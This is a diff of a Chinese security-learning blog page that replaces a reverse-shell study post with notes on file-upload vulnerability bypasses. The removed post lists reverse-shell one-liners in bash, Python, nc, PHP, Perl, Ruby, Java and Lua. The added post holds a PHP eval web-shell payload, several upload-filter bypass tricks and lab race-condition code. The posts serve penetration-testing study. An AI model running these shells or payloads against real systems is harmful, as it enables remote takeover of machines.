@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="反弹shell学习, l0odrd的博客">
+    <meta name="keywords" content="文件上传知识点总结, l0odrd的博客">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>反弹shell学习 | l0odrd的博客</title>
+    <title>文件上传知识点总结 | l0odrd的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -266,12 +266,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">反弹shell学习</h1>
+                    <h1 class="description center-align post-title">文件上传知识点总结</h1>
                 </div>
             </div>
         </div>
@@ -385,12 +385,25 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                                <span class="chip bg-color">文件上传</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-category">
+                                文件上传
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -399,28 +412,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-06-24
+                    2021-05-26
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-06-24
+                    2021-07-14
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.2k
+                    1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    4 分
                 </div>
                 
 
@@ -440,54 +453,98 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="linux下反弹shell的几种方法"><a href="#linux下反弹shell的几种方法" class="headerlink" title="linux下反弹shell的几种方法"></a>linux下反弹shell的几种方法</h2><p>测试环境说明</p>
-<p>攻击者：kali2020.03 64位 192.168.229.129</p>
-<p>靶机：kali2018 192.168.229.130</p>
-<p>[</p>
-<p>](<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/178150.html">https://www.freebuf.com/articles/system/178150.html</a>)</p>
-<h3 id="bash-反弹"><a href="#bash-反弹" class="headerlink" title="bash 反弹"></a>bash 反弹</h3><p>反弹shell的命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p>开启监听端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp port</span><br></pre></td></tr></table></figure>
-<p>受害机上使用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br><span class="line">解释：</span><br><span class="line">bash -i代表在本地打开一个bash</span><br><span class="line">然后就是&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port， &#x2F;dev&#x2F;tcp&#x2F;是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接</span><br><span class="line">&gt;&amp;后面跟上&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出</span><br><span class="line">加上0&gt;&amp;1，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port这个文件，也就是远程，那么标准输入也就重定向到了远程，这样的话就可以直接在远程输入了</span><br></pre></td></tr></table></figure>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623305370591-81a7de94-5ef7-4df9-afb8-ca230297e390.png" alt="img"></p>
-<h3 id="python-反弹"><a href="#python-反弹" class="headerlink" title="python 反弹"></a>python 反弹</h3><p>反弹shell的命令变为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;ip&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</span><br></pre></td></tr></table></figure>
+                <h2 id="常见web漏洞学习之文件上传"><a href="#常见web漏洞学习之文件上传" class="headerlink" title="常见web漏洞学习之文件上传"></a>常见web漏洞学习之文件上传</h2><blockquote>
+<p>.htacess的Apache解析漏洞</p>
+<p>配合文件包含，图片马</p>
+<p>条件竞争</p>
+</blockquote>
+<h3 id="客户端验证"><a href="#客户端验证" class="headerlink" title="客户端验证"></a>客户端验证</h3><p>js校验后缀名</p>
+<p>绕过：先把木马改为jpg或其他形式，burp抓包后修改为php</p>
+<h3 id="服务端验证"><a href="#服务端验证" class="headerlink" title="服务端验证"></a>服务端验证</h3><ol>
+<li>MIME</li>
+</ol>
+<p>绕过：burp修改文件头content-type字段为image/gif</p>
+<ol start="2">
+<li>文件内容头</li>
+</ol>
+<p>在<img src alt="img">马之前加上一些图片信息，如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a&lt;?php @eval($_POST[&#39;caidao&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
 
 
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623305501499-5f0540e6-7b0f-40f4-940a-4082513732f0.png" alt="img"></p>
-<h3 id="nc-反弹"><a href="#nc-反弹" class="headerlink" title="nc 反弹"></a>nc 反弹</h3><p>条件是靶机上有nc</p>
-<p>尝试两种方法后都莫有成功</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp port</span><br><span class="line"></span><br><span class="line">nc -e &#x2F;bin&#x2F;sh ip port </span><br><span class="line">-e后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(&#x2F;bin&#x2F;bash)，也就是反弹一个shell给远程</span><br></pre></td></tr></table></figure>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307363295-39c15dae-1953-4fa5-9734-4a9cd7b14533.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307406531-927cfb8d-dfef-47f4-ae92-b22f6432bed7.png" alt="img"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp port</span><br><span class="line">nc -nvlp port</span><br><span class="line">nc ip port|&#x2F;bin&#x2F;bash|ip port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用nc监听端口反弹shell时可能会有一个警告：</span><br><span class="line">Warning: forward host lookup failed for bogon: Unknown host,</span><br><span class="line">根据nc帮助文档的提示加上-n参数就可以不产生这个警告了</span><br><span class="line">-n参数代表在建立连接之前不对主机进行dns解析</span><br></pre></td></tr></table></figure>
+<ol>
+<li>文件扩展名校验（白名单，黑名单）</li>
+<li>文件内容检测（检测内容是否合法或是是否有恶意代码）</li>
+</ol>
+<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><ol>
+<li><strong>大小写、双写</strong>绕过pphphp</li>
+<li>文件名后加上个**.<strong>或是</strong>空格**（burp中修改）</li>
+</ol>
+<ul>
+<li>🔲尝试黑名单可能没有的类型，如<strong>asa、cer、.htaccess</strong></li>
+</ul>
+<blockquote>
+<p>.htaccess是Apache的</p>
+</blockquote>
+<ol start="4">
+<li><p>修改后缀类型，php修改为<strong>php3、php5</strong>（php高版本会向低版本兼容）</p>
+</li>
+<li><p>针对Windows系统，上传不符合Windows命名规则的文件名，可以尝试**::$DATA<strong>进行绕过或是</strong>:1.jpg**</p>
+</li>
+</ol>
+<blockquote>
+<p>windows下文件名+::$DATA，会把它当做数据流来处理，不会检验文件的后缀名，并且保留::$DATA之前的的文件名及后缀</p>
+<p>简单来说，数据流$DATA是Windows下NTFS文件系统的一个特性，即NTFS文件系统的存储数据流的一个属性DATA时，就是请求 a.asp 本身的数据，如果a.asp 还包含了其他的数据流，比如 a.asp:lake2.asp，请求 a.asp:lake2.asp::$DATA，则是请求a.asp中的流数据lake2.asp的流数据内容。</p>
+</blockquote>
+<ol start="6">
+<li><strong>%00</strong>截断，解析的时候会自动忽略%00后面的内容</li>
+</ol>
+<blockquote>
+<ul>
+<li>常用在服务端把文件路径和文件名加在一起进行判断后缀</li>
+<li>截断条件：</li>
+</ul>
+<p><em>php &lt; 5.3.4</em></p>
+<p>php.ini文件<em>magic_quotes_gpc</em>为<em>off</em>（这个函数的作用是转义字符，在php&gt;5.4.0中已经移除了） </p>
+<ul>
+<li>当参数是以post方式传入时，需要二进制修改 <code>2e</code>改为<code>00</code></li>
+</ul>
+</blockquote>
+<ol start="7">
+<li>🔲配合<strong>文件包含</strong>使用</li>
+</ol>
+<blockquote>
+<p>上传<strong>图片马</strong></p>
+<p>拼接图片马：copy xxx.jpg /b + shell.php /a shell.jpg （b是binary二进制的意思，/b就是以二进制的格式）</p>
+<p>进行文件包含</p>
+</blockquote>
+<ol start="8">
+<li>🔲<strong>条件竞争</strong></li>
+</ol>
+<blockquote>
+<p>简单来说就是利用了并发处理请求不当或是相关操作逻辑顺序设计不合理时，会导致条件竞争的发生</p>
+<p>具体实例可见upload-labs pass17、18</p>
+<p>pass17源码 – 利用方式：在文件删除之前访问文件</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</span><br><span class="line">    $file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];  &#x2F;&#x2F;$_FILES数组，$file_name就是upload_file的文件名</span><br><span class="line">    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];  &#x2F;&#x2F;$temp_file就是upload_file的临时文件名</span><br><span class="line">    $file_ext &#x3D; substr($file_name,strrpos($file_name,&quot;.&quot;)+1);  &#x2F;&#x2F;返回$file_name的文件后缀</span><br><span class="line">    $upload_file &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line"></span><br><span class="line">    if(move_uploaded_file($temp_file, $upload_file))&#123;  &#x2F;&#x2F;对$temp_file进行合法检验</span><br><span class="line">        if(in_array($file_ext,$ext_arr))&#123;  &#x2F;&#x2F;判断$file_ext是否在$ext_arr中，即判断文件后缀是否合法</span><br><span class="line">             $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload &#x3D; true;</span><br><span class="line">        &#125;else&#123;  &#x2F;&#x2F;如果后缀不合法</span><br><span class="line">            $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg &#x3D; &#39;上传出错！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307323674-b71ca629-7869-4534-ab4e-3feb9986cfd7.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307242554-99df599d-d6cf-4913-8fde-69cd68b76c2d.png" alt="img"></p>
-<h3 id="php-反弹"><a href="#php-反弹" class="headerlink" title="php 反弹"></a>php 反弹</h3><p>注意php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数  </p>
-<p>默认的php.ini文件中没有打开安全模式</p>
-<p>使用php的exec函数执行反弹shell的命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -&#39;exec(&quot;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port&quot;)&#39;</span><br></pre></td></tr></table></figure>
-<p>但是没有成功</p>
-<p> 之前乌云知识库上的一个姿势，使用php的fsockopen去连接远程：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;ip&quot;,port);exec(&quot;&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>
 
 
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623311000363-c37aba29-3a5d-4a03-b086-93ac4b0df42b.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623310925650-41688ec7-49d7-4aea-9b28-012b0c4afcb2.png" alt="img"></p>
-<h3 id="附上国外大佬整理的各种版本的shell写法"><a href="#附上国外大佬整理的各种版本的shell写法" class="headerlink" title="附上国外大佬整理的各种版本的shell写法"></a>附上国外大佬整理的各种版本的shell写法</h3><p><a target="_blank" rel="noopener" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#bash版本：</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;8080 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">#perl版本:</span><br><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;10.0.0.1&quot;;$p&#x3D;1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br><span class="line"></span><br><span class="line">#python版本：</span><br><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br><span class="line"></span><br><span class="line">#php版本：</span><br><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br><span class="line"></span><br><span class="line">#ruby版本：</span><br><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span><br><span class="line"></span><br><span class="line">#nc版本：</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;nc版本正确，存在-e选项就能直接反弹shell</span><br><span class="line">nc -e &#x2F;bin&#x2F;sh 10.0.0.1 1234 </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;不存在-e选项</span><br><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;&#x2F;tmp&#x2F;f</span><br><span class="line"></span><br><span class="line">nc x.x.x.x 8888|&#x2F;bin&#x2F;sh|nc x.x.x.x 9999</span><br><span class="line"></span><br><span class="line">#java版本</span><br><span class="line">r &#x3D; Runtime.getRuntime()</span><br><span class="line">p &#x3D; r.exec([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br><span class="line"></span><br><span class="line">#lua</span><br><span class="line">lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t&#x3D;socket.tcp();t:connect(&#39;10.0.0.1&#39;,&#39;1234&#39;);os.execute(&#39;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</span><br></pre></td></tr></table></figure>
-<h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><h2 id="powershell反弹shell的方法"><a href="#powershell反弹shell的方法" class="headerlink" title="powershell反弹shell的方法"></a>powershell反弹shell的方法</h2><p>测试环境说明</p>
-<p>攻击者：kali2020.03 64位 192.168.229.129</p>
-<p>靶机：win7 x64 192.168.229.134</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623318265542-562f9432-6581-422d-89ef-d854d7a3feb0.png" alt="img"></p>
-<p>emmm暂时先鸽了</p>
-<h2 id="其他反弹shell的方式"><a href="#其他反弹shell的方式" class="headerlink" title="其他反弹shell的方式"></a>其他反弹shell的方式</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkxNDEwMDA4Mw==&mid=2247483867&idx=1&sn=ac1c105241c071190fae3d18938e9189&chksm=c172dbc7f60552d1e0e0dd5a23d71e00e6472ba344088c6811a7c426a2cf08cfc2af0ba06a80&scene=178&cur_album_id=1555994601520431105#rd">利用ICMP(icmpsh)协议反弹Shell</a></p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/178150.html">linux下几种反弹shell方法的总结与理解</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/99793">powershell反弹shell常见方式</a></p>
+
+
+<h3 id="一些函数"><a href="#一些函数" class="headerlink" title="一些函数"></a>一些函数</h3><ul>
+<li>trim(string,charlist) ——<strong>移除</strong>字符串两侧的空白或其他预定义的字符charlist</li>
+<li>strrchr(string,char) ——在string中<strong>查找</strong>char最后出现的位置，并返回（<strong>截取</strong>）包括char在内到字符串末尾的所有字符</li>
+<li>str_ireplace(find,replace,string) ——在string中找到find，然后进行<strong>替换</strong>replace</li>
+<li>substr(string,start,length可选) ——在string中从start处开始，<strong>返回</strong>length长度的<strong>字符串</strong></li>
+<li>strrpos(string,find,start可选) ——在string中从start开始，<strong>返回</strong>最后一次出现的<strong>位置</strong></li>
+<li>move_uploaded_file(string $filename,string $destination) ——检测确保上传的文件filename是合法的（即通过post方式上传），如果合法就将其<strong>移动</strong>为由destination指定的文件</li>
+<li>in_array(data,array) —— 检查数组array中是否存在某个值data</li>
+</ul>
+<h3 id="参考的一些博客"><a href="#参考的一些博客" class="headerlink" title="参考的一些博客"></a>参考的一些博客</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39670065/article/details/107366077?spm=1001.2014.3001.5501">upload-labs通关记录</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4029#toc-15">Upload-labs 20关通关笔记</a></p>
+<p><a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/web/fileuploads.html">狼组公开文库</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luolaobiao/p/9917878.html">常见的文件上传绕过和文件解析漏洞</a></p>
 
                 
             </div>
@@ -514,7 +571,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://King10280.github.io/2021/06/24/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/">https://King10280.github.io/2021/06/24/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/</a>
+                    <a href="https://King10280.github.io/2021/05/26/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/">https://King10280.github.io/2021/05/26/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -551,7 +608,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                                    <span class="chip bg-color">文件上传</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -599,13 +660,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/06/24/ctf-web%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5/">
+                <a href="/2021/06/24/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="web入门sql注入">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="反弹shell学习">
                         
-                        <span class="card-title">web入门sql注入</span>
+                        <span class="card-title">反弹shell学习</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -620,23 +681,11 @@
                         </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/ctf-sql/" class="post-category">
-                                    ctf-sql
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            l0odrd
                             
                         </span>
                     </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/ctf-sql/">
-                        <span class="chip bg-color">ctf-sql</span>
-                    </a>
-                    
                 </div>
                 
             </div>
@@ -648,13 +697,12 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/05/26/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/">
+                <a href="/2021/05/24/Lampiao/">
                     <div class="card-image">
                         
+                        <img src="/images/dirty.png" class="responsive-img" alt="Lampiao">
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="文件上传知识点总结">
-                        
-                        <span class="card-title">文件上传知识点总结</span>
+                        <span class="card-title">Lampiao</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -665,14 +713,14 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-26
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-24
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-category">
-                                    文件上传
+                            <a href="/categories/vulnhub/" class="post-category">
+                                    vulnhub
                                 </a>
                             
                             
@@ -682,8 +730,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
-                        <span class="chip bg-color">文件上传</span>
+                    <a href="/tags/vulnhub/">
+                        <span class="chip bg-color">vulnhub</span>
                     </a>
                     
                 </div>
